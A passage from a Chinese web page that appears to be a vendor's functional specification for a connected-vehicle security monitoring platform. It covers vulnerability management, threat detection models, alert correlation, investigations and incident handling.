title="车联网相关资产字段模块："></a>车联网相关资产字段模块：</h6><p>车联网资产字段展示：系统支持展示车联网相关资产的字段，如硬件版本、软件版本、零部件编号、投标方信息、IP、ECUID、嵌入式操作系统版本、关联车型等。用户可以通过资产详情页面查看和管理车联网资产的详细信息。</p><h6 id="车型管理与导入模块："><a href="#车型管理与导入模块：" class="headerlink" title="车型管理与导入模块："></a>车型管理与导入模块：</h6><p>车型手动添加：系统支持手动添加车型，用户可以输入车型的相关信息，并进行保存和管理。</p><p>车型导入：系统支持通过其他平台对接导入车型信息，以便快速添加和管理大量车型数据。</p><h6 id="车型、车辆筛选与态势展示模块："><a href="#车型、车辆筛选与态势展示模块：" class="headerlink" title="车型、车辆筛选与态势展示模块："></a>车型、车辆筛选与态势展示模块：</h6><p>车型、车辆筛选：系统支持根据日期、供应商、车型年代等维度对车型和车辆进行筛选。用户可以根据需求设置筛选条件，以便快速找到需要的车型和车辆。</p><p>车型、车辆态势展示：系统提供车型态势和车辆态势的快捷查看功能。用户可以通过相关页面查看车型和车辆的态势信息，并快速了解相关资产的情况。</p><h6 id="车辆授权状态展示模块："><a href="#车辆授权状态展示模块：" class="headerlink" title="车辆授权状态展示模块："></a>车辆授权状态展示模块：</h6><p>车辆授权状态展示：系统支持展示车辆的授权状态，包括已授权、未授权等状态。用户可以通过车辆详情页面查看车辆的授权情况，并进行相应的管理和操作。</p><h6 id="车辆安全态势展示模块："><a href="#车辆安全态势展示模块：" class="headerlink" title="车辆安全态势展示模块："></a>车辆安全态势展示模块：</h6><p>车辆安全态势展示：系统支持查看车辆的安全态势，包括事件、车机资源等。用户可以通过车辆详情页面查看车辆的安全情况，并了解相关事件和车机资源的信息。</p><h5 id="漏洞管理-1"><a href="#漏洞管理-1" class="headerlink" title="漏洞管理"></a>漏洞管理</h5><p>漏洞管理：实时监测车联网平台中的漏洞情况，包括已知漏洞和新发现漏洞。</p><p>功能参数如下：</p><ul><li>相关操作要有权限管控机制；</li><li>支持与漏洞管理平台进行对接，同步漏洞信息；</li><li>支持不同维度查看主题漏洞库；</li><li>针对高危漏洞，支持自动生成工单，并通知到相应的负责人；</li><li>支持基于漏洞的多视角管理和分析，包括零部件供应商名称、漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度。</li></ul><h6 id="权限管控机制："><a href="#权限管控机制：" class="headerlink" title="权限管控机制："></a>权限管控机制：</h6><p>操作权限控制：支持对系统的相关操作进行权限管控，确保只有具有相应权限的用户才能执行敏感操作，例如记录事件、查询漏洞信息等。</p><h6 id="漏洞管理平台对接模块："><a href="#漏洞管理平台对接模块：" class="headerlink" title="漏洞管理平台对接模块："></a>漏洞管理平台对接模块：</h6><p>平台对接功能：支持与漏洞管理平台进行对接，实现漏洞信息的同步。可以通过API或其他方式与漏洞管理平台进行数据交互，确保漏洞信息的及时更新和同步。</p><h6 id="主题漏洞库查看模块："><a href="#主题漏洞库查看模块：" class="headerlink" title="主题漏洞库查看模块："></a>主题漏洞库查看模块：</h6><p>多维度查看：支持根据不同维度查看主题漏洞库。用户可以按照零部件供应商名称、漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度进行查看和筛选。</p><h6 id="高危漏洞工单生成与通知模块："><a href="#高危漏洞工单生成与通知模块：" class="headerlink" title="高危漏洞工单生成与通知模块："></a>高危漏洞工单生成与通知模块：</h6><p>自动工单生成：针对高危漏洞，系统支持自动生成工单。当检测到高危漏洞时，系统可以自动创建相应的工单，并将工单通知到相应的负责人。</p><h6 id="漏洞的多视角管理和分析模块："><a href="#漏洞的多视角管理和分析模块：" class="headerlink" title="漏洞的多视角管理和分析模块："></a>漏洞的多视角管理和分析模块：</h6><p>多维度管理和分析：支持基于漏洞的多视角管理和分析。用户可以从零部件供应商名称、漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度对漏洞进行管理和分析。</p><h5 id="威胁监测与分析"><a href="#威胁监测与分析" class="headerlink" title="威胁监测与分析"></a>威胁监测与分析</h5><p>威胁监测与分析：收集、整理和分析威胁情报数据，提供对车联网安全威胁的监测、分析、预警。</p><h6 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h6><ul><li>支持将大数据平台（TSP、OTA、PKI以及相关平台）同步的告警进行归并，将告警名称相同的告警进行聚合分析，默认是将最新一次告警时间为当天，告警处置状态为待处置、处置中、已处置的告警筛选出来，进行聚合分析，告警归并条件可基于关联规则进行配置，归并条件依赖于告警扩展属性策略，可根据扩展属性策略中的字段进行归并。</li><li>支持对特定字段的告警进行加白，降低误报率，可支持对告警中的资产ID、资产类型、资产名称、资产供应商等进行过滤加白。</li><li>支持对从大数据中同步的告警超30天的未处理的，自动设置告警状态为不处置。</li><li>基于WP29标准规定提供云端和车端威胁模型各5个，云端模型涉及sql注入攻击、CSRF跨站脚本伪造事件、数据库远程访问、代码执行、暴力破解；车端模型涉及非特权用户能够获得特权访问车辆系统、数据泄露（后端服务器上的车辆相关数据丢失或泄露(“数据泄露”)）、未经授权的数据传输（非授权情况下车辆数据提取、删除）、会话劫持（利用通信信道对车辆持有的代码/数据进行未经授权的操作、删除或其他修改）、重放攻击（通信通道破坏车辆功能的拒绝服务攻击）等，模型不能只限于简单的阈值设置的规则， 包含场景对应的行为基线分析、所需的告警关联描述，我司对每个模型对应场景及原理进行了描述，并已提供了测试用例，支持客户验证。我方后续提供持续技术支撑服务，3年内场景模型数量增加到20个。</li><li>云端模型包含：</li><li>主机恶意软件检测，通过拉取TSP平台运行云主机的EDR日志，分析其恶意软件的风险</li><li>通过TSP平台云主机的EDR日志，监测系统后端可被利用的高危漏洞信息</li><li>TSP平台系统主机行为异常分析，通过拉取TSP平台主机EDR流量的日志，结合威胁情报进行关联分析，分析潜在的恶意攻击。</li><li>Web应用安全检测，通过拉取TSP、OTA、PKI系统主机侧业务流量日志，进行webshell、sql注入等攻击分析，如webshell，通过对业务特征向量进行匹配，判断源IP到目的IP的Web访问日志里面是否有命令语句，并且对应的文件索引里是否有文件上传</li><li>车端安全模型包含不限于</li><li>车辆主机零部件漏洞检测，通过拉取漏洞管理平台数据中的数据，包括漏洞ID、漏洞CVSS值、漏洞描述、漏洞关联的资产信息等，以及资产属性的ID进行关联，实现对车辆零部件的漏洞的监测及漏洞修复状态监测</li><li>拒绝服务攻击检测：通过拉取TSP平台某车辆车机或TBOX系统访问请求信息数据，进行阈值设置，实现抗拒绝服务攻击的判断</li><li>未经授权的访问：通过拉取TSP平台某车辆数据的车机访问及进程数据，以及PKI认证数据的进行关联分析，判定访问过程的真实性和有效性。</li><li>中间人劫持攻击：拉取TSP平台记录某车辆的蓝牙ECU、NFC控制器数据验证失败信息次数，以及TSP平台蓝牙钥匙注册信息进行匹配，判断车辆遭遇中间人劫持攻击</li></ul><h6 id="告警管理与归并分析系统"><a href="#告警管理与归并分析系统" class="headerlink" title="告警管理与归并分析系统"></a>告警管理与归并分析系统</h6><p>我们的告警管理系统采用先进的数据归并技术，专门设计用于处理和分析大数据平台（如TSP、OTA、PKI等）同步的告警信息。系统默认设置能够捕捉最新的告警事件，并自动将名称相同的告警聚合在一起，便于分析。这一过程涉及将处置状态为待处置、处置中、已处置的告警进行筛选，并根据告警发生的时间（默认为当天）进行分组。</p><p>此外，告警归并条件的灵活性是通过一套可配置的关联规则来实现的。这些规则依赖于告警的扩展属性策略，允许用户根据策略中定义的字段来定制归并条件。这意味着用户可以根据实际需求，调整和优化告警聚合的逻辑，以支持更精细的告警管理和分析。</p><h6 id="告警误报管理"><a href="#告警误报管理" class="headerlink" title="告警误报管理"></a>告警误报管理</h6><p>在告警误报管理方面，我们的系统提供了一个加白机制，允许用户指定某些字段作为过滤条件，以减少误报。这些字段包括资产ID、资产类型、资产名称、资产供应商等，用户可以根据自己的安全政策将信任的资产或行为加入白名单。这样，当告警触发时，系统会检查这些字段，如果符合加白条件，则不会将其视为真正的威胁，从而减少了不必要的告警干扰，提高了安全团队对真实威胁的响应能力。</p><h6 id="告警状态自动化处理"><a href="#告警状态自动化处理" class="headerlink" title="告警状态自动化处理"></a>告警状态自动化处理</h6><p>为了提高告警处理的效率，我们的系统支持自动化的告警状态管理。特别是对于那些超过30天未处理的告警，系统将自动将其状态标记为“不处置”。这样的自动化处理不仅减轻了安全团队的工作负担，而且保证了告警列表的时效性和准确性，使团队能够集中精力处理当前和潜在的威胁。</p><h6 id="威胁模型构建"><a href="#威胁模型构建" class="headerlink" title="威胁模型构建"></a>威胁模型构建</h6><p>根据WP29标准规定，我们为云端和车端各提供了五个详尽的威胁模型。这些模型不仅仅是基于简单的阈值规则，而是包括了场景对应的行为基线分析和告警关联描述，确保了模型的复杂性和准确性。我们提供了每个模型对应的场景及原理描述，并附有测试用例，以便客户进行验证。我们承诺在未来三年内，将模型数量增加到20个，并提供持续的技术支持服务。</p><h6 id="云端和车端威胁模型模块："><a href="#云端和车端威胁模型模块：" class="headerlink" title="云端和车端威胁模型模块："></a>云端和车端威胁模型模块：</h6><p>云端和车端威胁模型提供：系统提供各5个云端和车端威胁模型，如未经授权访问后端服务器、影响运行车辆的后台服务中断包含OWASP TOP10类的攻击、中间人会话攻击等。每个模型都包含场景对应的行为基线分析、告警关联描述、对应场景及原理的描述和测试用例，以便客户进行验证。</p><p>云端模型：</p><p>主机恶意软件检测模型：</p><p>该模型基于机器学习和行为分析技术，通过分析云主机的EDR日志，识别恶意软件的风险。它使用大规模的恶意软件样本库进行训练，学习恶意软件的行为模式和特征，并根据日志中的进程行为、文件操作、网络连接等信息，进行实时的恶意软件检测和分类。该模型能够及时发现潜在的恶意软件活动，帮助用户采取必要的防护措施，保护云主机和敏感数据的安全。</p><p>测试用例为：主机恶意软件检测。</p><p>高危漏洞监测模型：</p><p>该模型利用漏洞扫描结果和补丁信息，监测TSP平台云主机后端存在的高危漏洞。它基于漏洞数据库和漏洞公告信息，对云主机进行漏洞匹配和风险评估，识别存在高危漏洞的主机，并提供相应的修复建议。该模型可以帮助用户及时发现和解决系统漏洞，减少被攻击的风险，提高云主机的安全性和稳定性。</p><p>测试用例为：高危漏洞监测</p><p>主机行为异常分析模型：</p><p>该模型结合威胁情报和行为分析技术，通过分析TSP平台主机EDR流量日志，检测主机行为的异常情况。它建立了主机行为的基准模型，监测主机的网络流量、进程行为、系统调用等，识别潜在的恶意攻击行为，如横向移动、命令执行等。该模型可以帮助用户及时发现异常活动，提供实时的威胁预警，加强对主机的安全监控和防护。</p><p>测试用例为：主机行为异常检测</p><p>Web应用安全检测模型：</p><p>该模型通过分析TSP、OTA、PKI系统主机侧业务流量日志，检测Web应用的安全风险。它利用机器学习和特征匹配技术，对Web访问日志进行分析，识别常见的Web应用攻击，如WebShell、SQL注入等，并检测文件上传等恶意操作。该模型可以帮助用户发现Web应用的安全漏洞，提供修复建议，提高Web应用的安全性和可靠性。</p><p>测试用例为：Web应用安全检测</p><p>网络流量异常检测模型：</p><p>该模型基于机器学习和行为分析技术，通过监测TSP平台云主机的网络流量，检测网络流量中的异常行为。它学习正常网络流量的模式，包括流量的来源、目的、协议、流量量等特征，并实时分析流量数据，识别与正常行为不符的异常流量模式。该模型可以帮助用户发现潜在的网络攻击、数据泄露等异常行为，及时采取相应的安全措施，保护云主机和网络的安全。</p><p>测试用例为：网络流量异常检测</p><p>用户行为分析模型：</p><p>该模型通过分析TSP平台的用户行为日志，检测用户行为中的异常模式和风险行为。它建立用户行为的基准模型，学习正常的用户行为模式和特征，如登录频率、访问路径、操作行为等，并实时分析用户行为数据，识别与正常行为不符的异常行为。该模型可以帮助用户发现潜在的恶意用户、内部威胁等，提供实时的风险预警和安全防护，加强对用户行为的监控和管理。</p><p>测试用例为：用户行为异常检测</p><p>车端模型：</p><p>车辆主机零部件漏洞检测模型：</p><p>该模型通过与漏洞管理平台数据的关联，监测车辆主机零部件的漏洞情况。它拉取漏洞管理平台的数据，包括漏洞ID、漏洞CVSS值、漏洞描述、漏洞关联的资产信息等，并与车辆零部件的资产属性进行关联。通过分析漏洞数据和修复状态，实现对车辆零部件漏洞的监测和修复状态的监测。该模型可以帮助及时发现车辆主机零部件存在的漏洞，并推动漏洞修复工作的进行，提高车辆系统的安全性。</p><p>测试用例为：车辆主机零部件漏洞检测</p><p>拒绝服务攻击检测模型：</p><p>该模型通过拉取TSP平台某车辆车机或TBOX系统的访问请求信息数据，进行阈值设置，实现对拒绝服务攻击的检测。它分析车辆访问请求的频率、访问量等信息，并与预设的阈值进行比对，判断是否存在拒绝服务攻击。该模型可以帮助及时发现拒绝服务攻击行为，采取相应的防护措施，保障车辆系统的正常运行和服务质量。</p><p>测试用例为：拒绝服务攻击检测</p><p>未经授权的访问检测模型：</p><p>该模型通过拉取TSP平台某车辆数据的车机访问及进程数据，以及PKI认证数据的关联分析，判定访问过程的真实性和有效性，实现对未经授权访问的检测。它分析车辆访问数据和PKI认证数据的匹配情况，判断是否存在未经授权的访问行为。该模型可以帮助及时发现未经授权的访问行为，加强对车辆系统的访问控制和安全防护。</p><p>测试用例为：经授权的访问检测</p><p>中间人劫持攻击检测模型：</p><p>该模型通过拉取TSP平台记录某车辆的蓝牙ECU、NFC控制器数据验证失败信息次数，以及TSP平台蓝牙钥匙注册信息进行匹配，判断车辆是否遭遇中间人劫持攻击。它分析蓝牙ECU和NFC控制器数据验证失败的次数，并与蓝牙钥匙注册信息进行匹配，识别中间人劫持攻击的迹象。该模型可以帮助及时发现中间人劫持攻击，加强对车辆通信安全的保护和防范。</p><p>测试用例为：中间人劫持攻击检测</p><p>车辆行为异常检测模型：</p><p>该模型通过监测车辆的行车数据和传感器数据，检测车辆行为中的异常模式。它学习正常的车辆行为模式和特征，如加速度、转向角度、制动操作等，并实时分析车辆行为数据，识别与正常行为不符的异常行为。该模型可以帮助及时发现潜在的车辆劫持、异常操控等风险行为，提供实时的安全警报和防护，保障车辆和乘客的安全。</p><p>测试用例为：车辆行为异常检测</p><p>车辆固件完整性检测模型：</p><p>该模型通过监测车辆主机的固件文件，检测固件完整性和是否存在篡改。它对车辆主机的固件进行哈希计算，并与预先存储的哈希值进行比对，判断固件文件是否完整和是否被篡改。该模型可以帮助及时发现车辆主机固件的篡改和潜在的恶意软件注入，提供固件安全性的监测和保护，确保车辆系统的可信性和安全性。</p><p>测试用例为：车辆固件完整性检测</p><h6 id="持续技术支撑服务模块："><a href="#持续技术支撑服务模块：" class="headerlink" title="持续技术支撑服务模块："></a>持续技术支撑服务模块：</h6><p>持续技术支撑服务：将提供持续技术支撑服务，确保系统的稳定运行和演进。在3年内，将增加场景模型的数量到20个，以满足客户不断变化的需求和威胁情况。</p><h5 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h5><h6 id="日志关联规则建模模块："><a href="#日志关联规则建模模块：" class="headerlink" title="日志关联规则建模模块："></a>日志关联规则建模模块：</h6><p>允许用户通过图形化界面拖拽的方式，组合不同的计算单元并配置数据来源和关联规则，形成关联规则模型，不同模型对应不同的场景。系统可根据模型识别出满足条件的威胁告警。关联方式包括事件等于/不等于、事件包含、事件等于/小于、事件开始于/结束于等，同时可支持AND/OR/NOT等逻辑运算、多层级嵌套，实现模型的细粒度化。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b413e9d77dd09f329cda3c0ffddcfc5b.png" alt="IMG_256"></p><p>关联规则设置</p><h6 id="预置关联分析场景模块："><a href="#预置关联分析场景模块：" class="headerlink" title="预置关联分析场景模块："></a>预置关联分析场景模块：</h6><p>安全分析还提供了预置的关联分析场景，以帮助用户快速发现潜在的威胁事件。这些预置场景包括攻击利用、恶意软件、拒绝服务、异常事件、敏感信息收集、威胁活动、威胁情报命中等不同类型的威胁场景分析。通过选择适当的预置场景，用户可以针对特定的威胁类型进行分析，从而更加高效地识别和应对威胁。</p><p>内部的数据分析算法，能够自动关联和分析相关的日志事件。例如，在攻击利用场景中，系统可以关联特定的攻击向量和漏洞利用行为，以检测可能的入侵和攻击行为。在恶意软件场景中，系统可以关联恶意软件的行为特征，识别潜在的恶意软件感染事件。用户只需选择相应的预置场景，并进行配置和调整，系统即可自动进行关联分析，并生成相应的威胁告警和报告。</p><p>使用户无需从零开始建立关联规则，节省了时间和精力。同时，预置场景也具备一定的灵活性，用户可以根据实际情况进行定制和调整，以满足特定的安全需求。</p><h6 id="调查任务与证据管理模块："><a href="#调查任务与证据管理模块：" class="headerlink" title="调查任务与证据管理模块："></a>调查任务与证据管理模块：</h6><p>威胁监测与分析系统提供调查任务与证据管理功能，用户可以通过新增调查任务对可疑事件进行调查，并进行相关证据的管理。</p><p>当用户发现可疑事件或异常行为时，可以通过系统添加调查任务，以便对该事件进行深入的调查和分析。用户可以指定调查任务的名称、描述、优先级等信息，以便更好地组织和管理调查工作。</p><p>在调查任务中，用户可以添加不同类型的证据，包括告警、漏洞、配置核查、日志、文本、弱口令等。用户可以根据需要，添加、管理和查看相关证据，以便进行调查和分析工作。例如，用户可以上传告警信息、漏洞扫描报告、配置核查结果、关键日志文件等作为证据，以支持调查任务的进行。</p><p>通过调查任务与证据管理功能，用户可以更好地组织和跟踪调查工作，确保调查过程的有序性和可追溯性。用户可以随时查看和更新调查任务的状态和进展，并对相关证据进行分析和比对，以发现潜在的威胁事件或安全漏洞。</p><p>这一功能的设计旨在帮助用户更有效地进行调查和分析工作，提高威胁发现和应对的效率。通过集中管理调查任务和相关证据，用户可以更好地组织和协调安全团队的工作，加强对可疑事件的跟踪和处理，从而提升车联网系统的整体安全性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/af338af140da4df27e388716f26acf1a.png" alt="IMG_256"></p><p>调查任务与证据管理</p><h6 id="重复告警归并模块："><a href="#重复告警归并模块：" class="headerlink" title="重复告警归并模块："></a>重复告警归并模块：</h6><p>威胁监测与分析系统提供重复告警归并功能，用户可以根据设定的归并条件对相似的告警进行合并，以减少冗余的告警信息。</p><p>系统支持多种归并条件，包括检测规则ID、源IP、目的IP、源端口、目的端口、通信方向、协议、漏洞名称、CVE编号、设备规则ID等。用户可以根据实际需求选择适当的归并条件，以确保合并的告警具有一定的相似性。</p><p>当系统接收到多个相似的告警时，会根据用户设定的归并条件进行比对和合并。如果告警的相关字段满足设定的归并条件，则系统将这些告警归并为一条，以避免信息的重复性和冗余性。</p><p>通过重复告警归并功能，用户可以更好地管理和处理大量的告警信息。合并相似的告警可以减少冗余的信息，提高告警的可读性和可操作性。同时，归并后的告警可以更清晰地展示威胁的实际情况，帮助用户更准确地评估威胁的严重程度和优先级，从而更有效地采取相应的安全措施。</p><p>这一功能的设计旨在帮助用户更好地处理告警信息，提高威胁监测和应对的效率。通过减少重复和冗余的告警，用户可以更快速地发现和响应真正的安全威胁，提升车联网系统的整体安全性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/147ee14ec3177d04359380df3b9ced05.png" alt="IMG_256"></p><p>告警聚合</p><h6 id="统计规则建模模块："><a href="#统计规则建模模块：" class="headerlink" title="统计规则建模模块："></a>统计规则建模模块：</h6><p>威胁监测与分析系统提供了统计规则建模的功能，使用户能够在指定的时间范围内对符合过滤条件的日志中的数字类字段进行统计分析。这项功能允许用户根据自己的需求设定过滤条件，以便筛选出感兴趣的日志事件，并对其中的数字字段进行统计。</p><p>用户可以根据具体的要求设置过滤条件，例如选择特定的日志源、事件类型、时间范围等，以准确获取所需的日志数据。系统将根据这些过滤条件从日志中提取出符合条件的记录，并对其中的数字类字段进行统计。用户可以选择不同的统计方法，如计数、求和、平均值等，以获得所需的统计结果。</p><p>与此同时，用户还可以设定阈值，并将统计结果与阈值进行比较，以发现异常威胁事件。通过设定合适的阈值，系统将根据统计结果判断是否超过了预设的阈值，并生成相应的告警或警示用户进一步进行分析和处理。</p><p>这一功能的目的是帮助用户更好地理解系统的运行情况，并及时发现潜在的威胁事件。通过对数字类字段的统计分析，用户可以获得关键的指标和趋势，从而更好地评估系统的安全性和性能。这样，用户可以及时采取相应的措施，以保障车联网系统的安全运行。</p><h6 id="资产详情信息展示模块："><a href="#资产详情信息展示模块：" class="headerlink" title="资产详情信息展示模块："></a>资产详情信息展示模块：</h6><p>威胁监测与分析系统提供资产详情信息展示功能，用户可以通过分组图表的方式直观展示资产的详细信息，包括资产名称、IP地址、分组、厂商、型号、操作系统类型、物理地址、责任人、外联情况等基础信息。</p><p>系统支持将资产按照不同的分组进行展示，用户可以根据需要创建和管理不同的资产分组，例如按照地理位置、部门、业务功能等进行分类。通过分组图表展示，用户可以更清晰地了解每个分组中的资产情况，便于进行资产管理和分析。</p><p>在资产详情信息中，用户可以查看每个资产的具体信息，包括资产名称、IP地址、厂商、型号、操作系统类型、物理地址、责任人、外联情况等。这些信息提供了对资产的基础描述和特征，有助于用户了解资产的属性和配置。</p><p>通过资产详情信息展示功能，用户可以更好地进行资产管理和分析工作。用户可以快速查找和识别特定资产，了解其所属分组和基本属性，从而更好地规划和执行安全策略。此外，资产详情信息的图表展示方式使用户可以直观地把握资产的分布和关联关系，有助于发现潜在的安全风险和漏洞。</p><p>这一功能的设计旨在提供直观、全面的资产详情信息展示，帮助用户更好地管理和分析车联网系统中的各类资产，提高系统的整体安全性和可管理性。</p><h6 id="攻击者数据分析"><a href="#攻击者数据分析" class="headerlink" title="攻击者数据分析"></a>攻击者数据分析</h6><p>攻击者数据分析：对靶场攻击者行为和关键信息进行分析，结合现有资产信息，形成资产风险预警。</p><p>攻击者行为分析模块：</p><p>攻击行为识别：通过对靶场的攻击行为进行分析，识别攻击者的攻击手段、攻击路径和攻击目标等关键信息。系统可以根据攻击者的行为模式和攻击特征，对其进行分类和识别。</p><p>资产风险预警模块：</p><p>资产关联分析：将攻击者的攻击行为与现有资产信息进行关联分析，识别潜在的资产风险。系统可以通过分析攻击者的攻击目标和攻击手段，预测可能受到攻击的资产，并提供相应的风险预警。</p><p>威胁情报整合模块：</p><p>威胁情报源整合：整合多个威胁情报源的数据，包括公开的漏洞信息、黑客论坛的攻击技术、恶意软件样本等，以获取更全面的威胁情报。系统可以将这些威胁情报与攻击者行为进行对比和分析，进一步提高资产风险预警的准确性。</p><p>可视化展示模块：</p><p>资产风险图表展示：通过图表和统计数据的形式展示资产风险的情况，包括受攻击次数最多的资产、攻击者的攻击手段分布、攻击目标的分布等。这样可以帮助用户更直观地了解资产的风险状况。</p><h6 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h6><ul><li>支持日志关联规则建模，通过类VISIO的图形化连线拖拽交互，灵活组合规则建模中的计算单元（包括5类计算单元：日志过滤、日志关联、日志统计、阈值比较和序列分析）以应对不同威胁场景建模，在指定的时间范围内，能够对来自不同数据源的日志进行关联分析，以发现可信度更高的威胁告警，通过配置数据来源（如漏洞管理平台、安全检测平台、OTA平台、TSP平台、OTA平台），配置统计和关联规则，如根据车辆位置经纬度、车辆速度信息进行关联分析（设定一个车辆位置数值的突然变量的规则+车辆速度变化程度的规则），可判断车辆遭受GPS欺骗或者伪基站攻击。同时可支持AND/OR/NOT等逻辑运算、多层级嵌套，实现模型的细粒度化。</li><li>支持预置汽车网络威胁关联分析场景，包括：云端异常访问及提权、车端拒绝服务、车端网络异常事件、敏感信息收集、威胁活动、威胁情报命中等不同威胁场景的分析；支持统计规则建模，在指定的时间范围内，对TSP、OTA告警日志中符合过滤条件的日志中数字类字段进行统计，将其与阈值进行比较以发现异常威胁事件，界面截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/45f252f533cbe3976f3eb6f1c29ff77b.png" alt="1703523909198"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/661f69feeef606b33bce87f964d9a5ef.jpeg" alt="统计规则建模"></p><ul><li>支持对发生的事件进行调查取证，围绕一个安全事件进行证据收集，并将收集相关的告警、日志和漏洞等信息，通过时间线和攻击链方式展示来回溯并记录问题的发展过程和相关影响，以还原整个事件的攻击过程，一个调查任务通过添加证据进行证据管理，证据支持选择告警、漏洞ID、车辆资产名称、车辆资产属性等信息，界面截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5958f83888397440c8d76d033636195d.jpeg" alt="调查取证"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/25f04bacbfedc87fef97d5fd4f41edb9.jpeg" alt="证据管理"></p><ul><li>支持按照归并条件针对重复告警进行归并，归并条件包括不限于：检测规则ID、源IP、目的IP、源端口、目的端口、通信方向、协议、漏洞名称、CVE编号、设备规则ID等条件，界面截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cc5968fa0328b2cf41408f6cfad0359d.jpeg" alt="告警信息"></p><ul><li>分组图表支持资产详情信息的展示，能够展现资产名称、IP地址、分组、厂商、型号、操作系统类型、物理地址、责任人、外联情况等资产基础信息</li></ul><h4 id="事件处置"><a href="#事件处置" class="headerlink" title="事件处置"></a>事件处置</h4><h5 id="事件管理"><a href="#事件管理" class="headerlink" title="事件管理"></a>事件管理</h5><p>事件管理：实时监测车联网平台的安全事件，包括入侵事件、异常行为等。</p><p>功能参数如下：</p><ul><li>支持对车辆事件进行记录，包括事件时间、车型，车辆、设备类型，攻击类型，等级</li><li>可实现对事件的查询，可从时间、车型、车辆、攻击类型、设备类型等方式；</li><li>可实现对事件风险等级的判断，实现在线打分，计算事件等级结果；</li><li>支持攻击者画像，支持从攻击次数、攻击的等级、攻击时间、攻击组件、攻击接口等不同维度，以图表的形式展示一段时间内攻击数、攻击总数，统计周期可按日、周、月展示；</li><li>支持被害者画像，支持查看受害IP攻击信息统计，以可视化的方式展示攻击手段的统计，攻击时间分布，支持展示攻击详细列表数据；</li><li>所有事件均保存到数据库中，做统一存储、访问管理。</li></ul><h6 id="车辆事件记录模块："><a href="#车辆事件记录模块：" class="headerlink" title="车辆事件记录模块："></a>车辆事件记录模块：</h6><p>事件记录功能：支持对车辆事件进行记录，包括事件时间、车型、车辆、设备类型、攻击类型、等级等信息。将事件信息保存到数据库中，以便后续查询和分析。</p><h6 id="事件查询功能模块："><a href="#事件查询功能模块：" class="headerlink" title="事件查询功能模块："></a>事件查询功能模块：</h6><p>多维度查询：支持根据时间、车型、车辆、攻击类型、设备类型等方式对事件进行查询。用户可以根据自己的需求，灵活地筛选和检索特定的事件。</p><h6 id="事件风险等级判断模块："><a href="#事件风险等级判断模块：" class="headerlink" title="事件风险等级判断模块："></a>事件风险等级判断模块：</h6><p>在线打分：支持对事件的风险等级进行判断和评估。系统可以根据预设的规则和算法，对事件进行在线打分，并计算出事件的风险等级结果。</p><h6 id="攻击者画像展示模块："><a href="#攻击者画像展示模块：" class="headerlink" title="攻击者画像展示模块："></a>攻击者画像展示模块：</h6><p>多维度画像展示：支持根据攻击者的攻击次数、攻击等级、攻击时间、攻击组件、攻击接口等不同维度，以图表的形式展示一段时间内的攻击数和攻击总数。统计周期可按日、周、月进行展示。</p><h6 id="被害者画像展示模块："><a href="#被害者画像展示模块：" class="headerlink" title="被害者画像展示模块："></a>被害者画像展示模块：</h6><p>攻击信息统计展示：支持查看受害IP的攻击信息统计，以可视化的方式展示攻击手段的统计和攻击时间分布。同时，支持展示攻击的详细列表数据，让用户能够深入了解攻击的细节和特征。</p><h6 id="数据库存储与管理："><a href="#数据库存储与管理：" class="headerlink" title="数据库存储与管理："></a>数据库存储与管理：</h6><p>统一存储与访问管理：所有事件均保存到数据库中，实现统一的存储和访问管理。这样可以确保数据的安全性和一致性，并方便后续的数据分析和查询操作。</p><h6 id="安全事件检测模块："><a href="#安全事件检测模块：" class="headerlink" title="安全事件检测模块："></a>安全事件检测模块：</h6><p>实时监测：系统对车联网系统进行实时监测，检测各种安全事件，包括入侵尝试、异常行为、恶意软件活动等。系统可以使用各种检测技术，如行为分析、异常检测、规则引擎等，以确保及时发现安全事件。</p><h6 id="通报机制："><a href="#通报机制：" class="headerlink" title="通报机制："></a>通报机制：</h6><p>多渠道通知：系统可以通过多种渠道进行通知，包括电子邮件、短信、即时消息等。用户可以根据需要选择接收通知的方式，并设置通知优先级和接收人员。</p><p>预设通报规则：系统支持预设通报规则，用户可以根据事件的严重程度和紧急程度设置通报规则。例如，对于高危事件可以设置立即通报相关人员，而对于低危事件可以设置延迟通报或者仅通报给特定人员。</p><h6 id="事件通报管理模块："><a href="#事件通报管理模块：" class="headerlink" title="事件通报管理模块："></a>事件通报管理模块：</h6><p>通报记录管理：系统记录安全事件的通报历史，包括通报时间、通报内容、通报对象等信息。用户可以查看通报记录，了解事件的通报情况和处理进展。</p><p>通报反馈机制：系统支持通报的反馈机制，相关人员可以对通报事件进行反馈，提供处理进展、处理结果等信息。这样可以确保通报的及时性和有效性。</p><h5 id="威胁预警"><a href="#威胁预警" class="headerlink" title="威胁预警"></a>威胁预警</h5><p>威胁预警：根据威胁分析和风险评估结果，提供针对性的预警通知。</p><p>功能参数如下：</p><ul><li>支持本地威胁情报的检索，IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本、可视化分析、域名解析记录，相关功能的界面截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f411cb2a573d815106eb65bac16b334f.jpeg" alt="威胁情报本地库"></p><ul><li>支持云端威胁情报查询，查询结果需包含：IP主机信息、IP位置信息、域名流行度、情报IOC详情、相关样本、可视化分析、域名解析记录、域名注册信息、关联域名、数字证书等信息，相关功能的界面截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/870f0f35ed2840ef1857b9e2cbcffd71.jpeg" 